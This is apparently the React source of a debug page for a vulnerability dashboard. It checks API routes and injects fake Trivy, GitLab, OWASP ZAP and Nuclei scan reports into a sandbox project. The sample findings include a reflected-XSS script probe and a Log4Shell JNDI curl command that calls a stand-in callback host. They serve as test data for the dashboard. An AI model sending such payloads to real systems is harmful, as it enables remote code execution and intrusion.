import React, { useState, useCallback } from 'react'
import axios from 'axios'
import { ingestSample, deleteProjectByName } from '../api/client'

// ── Sandbox project name ──────────────────────────────────────────────────────
const SANDBOX = 'debug-sandbox'

// ── Route checks ─────────────────────────────────────────────────────────────
const ROUTES = [
  { label: 'Health',         method: 'GET', url: '/api/health',              note: 'Liveness' },
  { label: 'Dashboard',      method: 'GET', url: '/api/v1/stats/dashboard',  note: 'Stats aggregation' },
  { label: 'Findings list',  method: 'GET', url: '/api/v1/findings?page=1&page_size=1', note: 'Pagination' },
  { label: 'Projects list',  method: 'GET', url: '/api/v1/projects',         note: 'Project management' },
  { label: 'Rules list',     method: 'GET', url: '/api/v1/rules',            note: 'Auto-triage' },
  { label: 'Export CSV',     method: 'GET', url: '/api/v1/export/csv?page_size=1', note: 'CSV generation', expectBlob: true },
  { label: 'OpenAPI schema', method: 'GET', url: '/api/openapi.json',        note: 'Swagger schema' },
]

// ── Fake payloads per scanner ─────────────────────────────────────────────────
const SAMPLES = [
  {
    id: 'trivy',
    label: 'Trivy',
    color: '#38bdf8',
    icon: '🐳',
    desc: 'Image scan — 3 findings (CRITICAL, HIGH, MEDIUM)',
    endpoint: 'trivy',
    payload: {
      Results: [
        {
          Target: 'myapp:latest (debian 12.0)',
          Type: 'debian',
          Vulnerabilities: [
            {
              VulnerabilityID: 'CVE-2023-44487',
              PkgName: 'nghttp2',
              InstalledVersion: '1.52.0-1',
              FixedVersion: '1.52.0-1+deb12u1',
              Severity: 'HIGH',
              Title: 'HTTP/2 Rapid Reset Attack',
              Description: 'The HTTP/2 protocol allows a denial of service (server resource consumption) because request cancellation can reset many streams quickly.',
              CVSS: { nvd: { V3Score: 7.5, V3Vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H' } },
            },
            {
              VulnerabilityID: 'CVE-2023-4911',
              PkgName: 'glibc',
              InstalledVersion: '2.36-9+deb12u1',
              FixedVersion: '2.36-9+deb12u3',
              Severity: 'CRITICAL',
              Title: 'Looney Tunables — local privilege escalation via GLIBC_TUNABLES',
              Description: 'A buffer overflow was discovered in the GNU C Library\'s dynamic loader ld.so while processing the GLIBC_TUNABLES environment variable.',
              CVSS: { nvd: { V3Score: 9.8, V3Vector: 'CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' } },
            },
            {
              VulnerabilityID: 'CVE-2023-2975',
              PkgName: 'openssl',
              InstalledVersion: '3.0.9-1',
              FixedVersion: '3.0.10-1',
              Severity: 'MEDIUM',
              Title: 'OpenSSL AES-SIV cipher implementation contains a bug',
              Description: 'Issue summary: The AES-SIV cipher implementation contains a bug that causes it to ignore empty associated data entries.',
              CVSS: { nvd: { V3Score: 5.3, V3Vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N' } },
            },
          ],
        },
      ],
    },
  },
  {
    id: 'gitlab-sast',
    label: 'GitLab SAST',
    color: '#f97316',
    icon: '🔬',
    desc: 'Semgrep — 3 findings (Critical, High, Medium)',
    endpoint: 'gitlab-sast',
    payload: {
      version: '15.0.4',
      vulnerabilities: [
        {
          id: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4',
          category: 'sast',
          name: 'SQL Injection via raw query',
          message: 'User-controlled input passed directly to a raw SQL query',
          description: 'Detected user-supplied input used in a raw SQL query. This can lead to SQL injection.',
          severity: 'Critical',
          scanner: { id: 'semgrep', name: 'Semgrep' },
          location: { file: 'src/db/queries.py', start_line: 42, end_line: 42 },
          identifiers: [
            { type: 'semgrep_id', name: 'python.django.security.injection.sql', value: 'python.django.security.injection.sql' },
            { type: 'cwe', name: 'CWE-89', value: '89' },
          ],
        },
        {
          id: 'b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5',
          category: 'sast',
          name: 'Hardcoded secret in source',
          message: 'Hardcoded AWS access key found',
          description: 'A hardcoded AWS access key was detected in the source code. Rotate this credential immediately.',
          severity: 'High',
          scanner: { id: 'semgrep', name: 'Semgrep' },
          location: { file: 'config/aws.py', start_line: 8, end_line: 8 },
          identifiers: [
            { type: 'semgrep_id', name: 'generic.secrets.security.hardcoded-aws-secret', value: 'generic.secrets.security.hardcoded-aws-secret' },
            { type: 'cwe', name: 'CWE-798', value: '798' },
          ],
        },
        {
          id: 'c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6',
          category: 'sast',
          name: 'Use of insecure MD5 hash',
          message: 'MD5 is cryptographically weak and should not be used for sensitive data',
          description: 'The use of MD5 for hashing is considered insecure. Use SHA-256 or stronger.',
          severity: 'Medium',
          scanner: { id: 'semgrep', name: 'Semgrep' },
          location: { file: 'src/auth/utils.py', start_line: 17, end_line: 17 },
          identifiers: [
            { type: 'semgrep_id', name: 'python.lang.security.insecure-hash-algorithms.insecure-hash-algorithm-md5', value: 'python.lang.security.insecure-hash-algorithms.md5' },
            { type: 'cwe', name: 'CWE-327', value: '327' },
          ],
        },
      ],
      scan: { scanner: { id: 'semgrep', name: 'Semgrep' }, type: 'sast', status: 'success', start_time: '2024-01-14T10:00:00', end_time: '2024-01-14T10:01:30' },
    },
  },
  {
    id: 'gitlab-iac',
    label: 'GitLab IaC (KICS)',
    color: '#a855f7',
    icon: '☁️',
    desc: 'KICS — 2 findings (HIGH, MEDIUM)',
    endpoint: 'gitlab-iac',
    payload: {
      version: '15.0.4',
      vulnerabilities: [
        {
          id: 'd4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1',
          category: 'sast',
          name: 'Docker COPY Adding Sensitive Directory',
          message: 'Sensitive directory is being added to Docker image',
          description: 'COPY . . adds the entire build context, potentially including secrets and config files.',
          severity: 'High',
          scanner: { id: 'kics', name: 'KICS' },
          location: { file: 'Dockerfile', start_line: 5, end_line: 5 },
          identifiers: [
            { type: 'kics', name: 'Sensitive Directory Mount', value: 'b03a748a-542d-44f4-bb86-9199ab4fd2d5' },
            { type: 'cwe', name: 'CWE-732', value: '732' },
          ],
        },
        {
          id: 'e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2',
          category: 'sast',
          name: 'Container Running As Root',
          message: 'Container does not define a non-root user',
          description: 'Running containers as root increases the risk of container escape attacks.',
          severity: 'Medium',
          scanner: { id: 'kics', name: 'KICS' },
          location: { file: 'docker-compose.yml', start_line: 12, end_line: 12 },
          identifiers: [
            { type: 'kics', name: 'Container Running As Root', value: '9b6b2f85-92d4-4a6e-b46e-92d1c6e7e0d7' },
            { type: 'cwe', name: 'CWE-250', value: '250' },
          ],
        },
      ],
      scan: { scanner: { id: 'kics', name: 'KICS' }, type: 'sast', status: 'success', start_time: '2024-01-14T10:00:00', end_time: '2024-01-14T10:00:45' },
    },
  },
  {
    id: 'gitlab-secrets',
    label: 'GitLab Secrets',
    color: '#eab308',
    icon: '🔑',
    desc: 'Gitleaks — 2 findings (Critical)',
    endpoint: 'gitlab-secrets',
    payload: {
      version: '15.0.4',
      vulnerabilities: [
        {
          id: 'f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3',
          category: 'secret_detection',
          name: 'GitHub Personal Access Token',
          message: 'GitHub Personal Access Token detected in source code',
          description: 'A GitHub Personal Access Token was found. Revoke it immediately and rotate secrets.',
          severity: 'Critical',
          scanner: { id: 'gitleaks', name: 'Gitleaks' },
          location: { file: 'scripts/deploy.sh', start_line: 3, end_line: 3 },
          identifiers: [
            { type: 'gitleaks_rule_id', name: 'github-pat', value: 'github-pat' },
          ],
        },
        {
          id: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d5',
          category: 'secret_detection',
          name: 'Generic API Key',
          message: 'High-entropy string resembling an API key detected',
          description: 'A high-entropy string that resembles an API key or secret was found in a config file.',
          severity: 'Critical',
          scanner: { id: 'gitleaks', name: 'Gitleaks' },
          location: { file: 'config/settings.json', start_line: 22, end_line: 22 },
          identifiers: [
            { type: 'gitleaks_rule_id', name: 'generic-api-key', value: 'generic-api-key' },
          ],
        },
      ],
      scan: { scanner: { id: 'gitleaks', name: 'Gitleaks' }, type: 'secret_detection', status: 'success', start_time: '2024-01-14T10:00:00', end_time: '2024-01-14T10:00:10' },
    },
  },
  {
    id: 'owasp-zap',
    label: 'OWASP ZAP',
    color: '#f43f5e',
    icon: '🕷️',
    desc: 'DAST baseline scan — 2 findings (HIGH, MEDIUM)',
    endpoint: 'owasp-zap',
    payload: {
      site: [
        {
          '@name': 'https://myapp.example.com',
          '@host': 'myapp.example.com',
          '@port': '443',
          '@ssl': 'true',
          alerts: [
            {
              pluginid: '40012',
              alertRef: '40012-1',
              alert: 'Cross Site Scripting (Reflected)',
              name: 'Cross Site Scripting (Reflected)',
              riskcode: '3',
              confidence: '2',
              riskdesc: 'High (Medium)',
              desc: 'Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user\'s browser instance.',
              method: 'GET',
              evidence: '<script>alert(1);</script>',
              solution: 'Phase: Architecture and Design — Use a vetted library or framework that does not allow this weakness to occur.',
              instances: [
                { uri: 'https://myapp.example.com/search', method: 'GET', param: 'q', attack: '<script>alert(1);</script>', evidence: '<script>alert(1);</script>' },
              ],
            },
            {
              pluginid: '10038',
              alertRef: '10038-1',
              alert: 'Content Security Policy (CSP) Header Not Set',
              name: 'Content Security Policy (CSP) Header Not Set',
              riskcode: '2',
              confidence: '3',
              riskdesc: 'Medium (High)',
              desc: 'Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks.',
              method: 'GET',
              solution: 'Ensure that your web server, application server, load balancer, etc. is configured to set the Content-Security-Policy header.',
              instances: [
                { uri: 'https://myapp.example.com/', method: 'GET', param: '', attack: '', evidence: '' },
              ],
            },
          ],
        },
      ],
    },
  },
  {
    id: 'nuclei',
    label: 'Nuclei',
    color: '#22c55e',
    icon: '⚡',
    desc: 'Template scan — 2 findings (critical, high)',
    endpoint: 'nuclei',
    payload: [
      {
        'template-id': 'CVE-2021-44228',
        info: {
          name: 'Apache Log4j RCE (Log4Shell)',
          author: ['pdteam'],
          tags: ['cve', 'cve2021', 'log4j', 'rce', 'oast'],
          description: 'Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints.',
          severity: 'critical',
          classification: {
            cve_id: ['CVE-2021-44228'],
            cwe_id: ['CWE-917'],
            cvss_metrics: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H',
            cvss_score: 10.0,
          },
        },
        type: 'http',
        host: 'https://myapp.example.com',
        matched_at: 'https://myapp.example.com/api/login',
        matcher_name: 'oast-callback',
        timestamp: '2024-01-14T10:05:00Z',
        curl_command: 'curl -X POST https://myapp.example.com/api/login -d \'username=${jndi:ldap://oast.example.com/a}\'',
        request: 'POST /api/login HTTP/1.1\nHost: myapp.example.com\n\nusername=${jndi:ldap://oast.example.com/a}',
        response: 'HTTP/1.1 200 OK\n\n{"status":"ok"}',
      },
      {
        'template-id': 'CVE-2023-23397',
        info: {
          name: 'Microsoft Outlook NTLM Hash Leak',
          author: ['pdteam'],
          tags: ['cve', 'cve2023', 'outlook', 'ntlm'],
          description: 'Microsoft Outlook allows attackers to obtain NTLM hash of the victim by sending a specially crafted email.',
          severity: 'high',
          classification: {
            cve_id: ['CVE-2023-23397'],
            cwe_id: ['CWE-294'],
            cvss_metrics: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
            cvss_score: 9.8,
          },
        },
        type: 'http',
        host: 'https://myapp.example.com',
        matched_at: 'https://myapp.example.com/api/webhook',
        matcher_name: 'status-200',
        timestamp: '2024-01-14T10:05:05Z',
      },
    ],
  },
]

// ── Status badge ──────────────────────────────────────────────────────────────
function StatusBadge({ status }) {
  const cfg = {
    idle:    { bg: 'var(--bg-elevated)', color: 'var(--text-muted)',    label: 'idle' },
    running: { bg: '#1e3a5f',            color: '#60a5fa',              label: 'checking…' },
    ok:      { bg: '#14532d',            color: 'var(--low)',           label: 'OK' },
    error:   { bg: '#3b0d0d',            color: 'var(--critical)',      label: 'FAIL' },
    injected:{ bg: '#14532d',            color: 'var(--low)',           label: '' },
  }
  const { bg, color, label } = cfg[status] || cfg.idle
  return (
    <span style={{
      padding: '2px 10px', borderRadius: 4, fontSize: '0.72rem', fontWeight: 700,
      fontFamily: 'var(--font-mono)', background: bg, color,
      display: 'inline-block', minWidth: 64, textAlign: 'center',
    }}>
      {status === 'running' ? <Spinner /> : (status === 'injected' ? label : label)}
    </span>
  )
}

function Spinner() {
  return <span style={{ display: 'inline-block', animation: 'spin 0.8s linear infinite' }}>⟳</span>
}

// ── Main page ─────────────────────────────────────────────────────────────────
export default function Debug() {
  // Route checks
  const [checks, setChecks]     = useState(() => Object.fromEntries(ROUTES.map(r => [r.url, { status: 'idle', ms: null, detail: null }])))
  const [checking, setChecking] = useState(false)

  // Sample injection
  const [injectState, setInjectState] = useState(() => Object.fromEntries(SAMPLES.map(s => [s.id, { status: 'idle', result: null }])))
  const [injecting, setInjecting]     = useState(null)

  // Cleanup
  const [cleaning, setCleaning]  = useState(false)
  const [cleanMsg, setCleanMsg]  = useState(null)

  // ── Run all route checks ──────────────────────────────────────────────────
  const runChecks = useCallback(async () => {
    setChecking(true)
    setChecks(Object.fromEntries(ROUTES.map(r => [r.url, { status: 'running', ms: null, detail: null }])))

    const token = localStorage.getItem('w3g_token')
    const headers = token ? { Authorization: `Bearer ${token}` } : {}

    await Promise.all(ROUTES.map(async (route) => {
      const t0 = performance.now()
      try {
        const res = await axios.get(route.url, { responseType: route.expectBlob ? 'blob' : 'json', headers })
        const ms = Math.round(performance.now() - t0)
        const ok = res.status >= 200 && res.status < 300
        setChecks(prev => ({ ...prev, [route.url]: { status: ok ? 'ok' : 'error', ms, detail: `HTTP ${res.status}` } }))
      } catch (e) {
        const ms = Math.round(performance.now() - t0)
        const detail = e.response ? `HTTP ${e.response.status}` : e.message
        setChecks(prev => ({ ...prev, [route.url]: { status: 'error', ms, detail } }))
      }
    }))

    setChecking(false)
  }, [])

  // ── Inject sample ─────────────────────────────────────────────────────────
  const inject = useCallback(async (sample, daysAgo = 0) => {
    setInjecting(sample.id)
    setInjectState(prev => ({ ...prev, [sample.id]: { status: 'running', result: null } }))
    try {
      const scanDate = daysAgo > 0
        ? new Date(Date.now() - daysAgo * 86_400_000).toISOString()
        : undefined
      const result = await ingestSample(
        sample.endpoint,
        sample.payload,
        { project: SANDBOX, branch: 'debug', commit: 'debugsample', pipeline: '0', ...(scanDate && { scan_date: scanDate }) },
      )
      setInjectState(prev => ({ ...prev, [sample.id]: { status: 'ok', result } }))
    } catch (e) {
      const msg = e.response?.data?.detail || e.message
      setInjectState(prev => ({ ...prev, [sample.id]: { status: 'error', result: msg } }))
    } finally {
      setInjecting(null)
    }
  }, [])

  // Spread 7 scanners across the last 30 days so the trend chart shows activity
  const SPREAD_DAYS = [28, 24, 20, 16, 12, 7, 3]
  const injectAll = useCallback(async () => {
    for (let i = 0; i < SAMPLES.length; i++) {
      await inject(SAMPLES[i], SPREAD_DAYS[i] ?? 0)
    }
  }, [inject])

  // ── Cleanup ───────────────────────────────────────────────────────────────
  const cleanup = useCallback(async () => {
    setCleaning(true)
    setCleanMsg(null)
    try {
      await deleteProjectByName(SANDBOX)
      setCleanMsg({ ok: true, text: `Project "${SANDBOX}" deleted.` })
      setInjectState(Object.fromEntries(SAMPLES.map(s => [s.id, { status: 'idle', result: null }])))
    } catch (e) {
      setCleanMsg({ ok: false, text: e.response?.data?.detail || e.message })
    } finally {
      setCleaning(false)
    }
  }, [])

  const allChecksOk  = ROUTES.every(r => checks[r.url].status === 'ok')
  const someCheckRan = ROUTES.some(r => checks[r.url].status !== 'idle')

  return (
    <div className="animate-in" style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem' }}>

      {/* Header */}
      <div>
        <h1 style={{ fontSize: '1.6rem', fontWeight: 800, letterSpacing: '-0.03em' }}>Debug</h1>
        <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', marginTop: 4 }}>
          Validate all routes and inject fake scan data into the <code style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent)', fontSize: '0.8rem' }}>{SANDBOX}</code> project.
        </p>
      </div>

      {/* ── Section 1: Route health ─────────────────────────────────────────── */}
      <div className="card">
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem' }}>
          <div>
            <h2 style={{ fontSize: '0.95rem', fontWeight: 700 }}>Route Health Check</h2>
            <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginTop: 2 }}>
              Tests {ROUTES.length} endpoints — GET requests, checks HTTP 2xx response
            </p>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            {someCheckRan && (
              <span style={{ fontSize: '0.75rem', color: allChecksOk ? 'var(--low)' : 'var(--critical)', fontFamily: 'var(--font-mono)', fontWeight: 700 }}>
                {allChecksOk ? '✓ All passing' : '✗ Some failures'}
              </span>
            )}
            <button className="btn btn-primary" onClick={runChecks} disabled={checking} style={{ fontSize: '0.82rem', padding: '6px 16px' }}>
              {checking ? 'Checking…' : 'Run checks'}
            </button>
          </div>
        </div>

        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.83rem' }}>
          <thead>
            <tr style={{ borderBottom: '1px solid var(--border)' }}>
              {['Endpoint', 'Method', 'Description', 'Status', 'Latency', 'Detail'].map(h => (
                <th key={h} style={{ textAlign: 'left', padding: '6px 10px', color: 'var(--text-muted)', fontWeight: 600, fontSize: '0.72rem', textTransform: 'uppercase', letterSpacing: '0.06em' }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {ROUTES.map((route) => {
              const c = checks[route.url]
              return (
                <tr key={route.url} style={{ borderBottom: '1px solid var(--border)' }}>
                  <td style={{ padding: '8px 10px', fontFamily: 'var(--font-mono)', color: 'var(--accent)', fontSize: '0.78rem' }}>{route.url}</td>
                  <td style={{ padding: '8px 10px', color: 'var(--text-muted)' }}>{route.method}</td>
                  <td style={{ padding: '8px 10px', color: 'var(--text-secondary)' }}>{route.note}</td>
                  <td style={{ padding: '8px 10px' }}><StatusBadge status={c.status} /></td>
                  <td style={{ padding: '8px 10px', fontFamily: 'var(--font-mono)', color: 'var(--text-muted)', fontSize: '0.78rem' }}>
                    {c.ms !== null ? `${c.ms} ms` : '—'}
                  </td>
                  <td style={{ padding: '8px 10px', fontFamily: 'var(--font-mono)', color: c.status === 'error' ? 'var(--critical)' : 'var(--text-muted)', fontSize: '0.75rem' }}>
                    {c.detail || '—'}
                  </td>
                </tr>
              )
            })}
          </tbody>
        </table>
      </div>

      {/* ── Section 2: Sample injection ────────────────────────────────────── */}
      <div className="card">
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem' }}>
          <div>
            <h2 style={{ fontSize: '0.95rem', fontWeight: 700 }}>Sample Data Injection</h2>
            <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginTop: 2 }}>
              Injects realistic fake findings into project <code style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent)', fontSize: '0.78rem' }}>{SANDBOX}</code>
            </p>
          </div>
          <button
            className="btn btn-primary"
            onClick={injectAll}
            disabled={injecting !== null}
            style={{ fontSize: '0.82rem', padding: '6px 16px' }}
          >
            {injecting ? 'Injecting…' : 'Inject all'}
          </button>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '0.75rem' }}>
          {SAMPLES.map((sample) => {
            const st = injectState[sample.id]
            const isRunning = injecting === sample.id
            return (
              <div key={sample.id} style={{
                border: `1px solid ${st.status === 'ok' ? sample.color + '44' : 'var(--border)'}`,
                borderLeft: `3px solid ${sample.color}`,
                borderRadius: 6, padding: '0.85rem 1rem',
                background: 'var(--bg-elevated)',
                display: 'flex', flexDirection: 'column', gap: 8,
              }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: '1.2rem' }}>{sample.icon}</span>
                    <span style={{ fontWeight: 700, fontSize: '0.88rem' }}>{sample.label}</span>
                  </div>
                  <button
                    className="btn btn-ghost"
                    onClick={() => inject(sample)}
                    disabled={injecting !== null}
                    style={{ fontSize: '0.75rem', padding: '3px 12px', opacity: injecting && injecting !== sample.id ? 0.5 : 1 }}
                  >
                    {isRunning ? 'Injecting…' : 'Inject'}
                  </button>
                </div>

                <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', margin: 0 }}>{sample.desc}</p>

                {st.status !== 'idle' && (
                  <div style={{
                    borderRadius: 4, padding: '6px 10px', fontSize: '0.75rem',
                    fontFamily: 'var(--font-mono)',
                    background: st.status === 'ok' ? '#14532d44' : st.status === 'error' ? '#3b0d0d44' : 'var(--bg-overlay)',
                    color: st.status === 'ok' ? 'var(--low)' : st.status === 'error' ? 'var(--critical)' : 'var(--text-muted)',
                  }}>
                    {isRunning && '⟳ sending…'}
                    {st.status === 'ok' && st.result && (
                      <>✓ {st.result.findings_created} created · {st.result.findings_updated} updated · {st.result.rules_applied} rules</>
                    )}
                    {st.status === 'error' && `✗ ${st.result}`}
                  </div>
                )}
              </div>
            )
          })}
        </div>
      </div>

      {/* ── Section 3: Cleanup ─────────────────────────────────────────────── */}
      <div className="card" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.75rem' }}>
        <div>
          <h2 style={{ fontSize: '0.95rem', fontWeight: 700 }}>Cleanup</h2>
          <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', marginTop: 2 }}>
            Deletes the <code style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent)', fontSize: '0.78rem' }}>{SANDBOX}</code> project and all its findings (irreversible).
          </p>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          {cleanMsg && (
            <span style={{ fontSize: '0.78rem', fontFamily: 'var(--font-mono)', color: cleanMsg.ok ? 'var(--low)' : 'var(--critical)' }}>
              {cleanMsg.ok ? '✓' : '✗'} {cleanMsg.text}
            </span>
          )}
          <button
            className="btn"
            onClick={cleanup}
            disabled={cleaning}
            style={{ fontSize: '0.82rem', padding: '6px 16px', background: 'var(--critical-bg)', color: 'var(--critical)', border: '1px solid var(--critical)44' }}
          >
            {cleaning ? 'Deleting…' : `Delete ${SANDBOX}`}
          </button>
        </div>
      </div>

      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
    </div>
  )
}
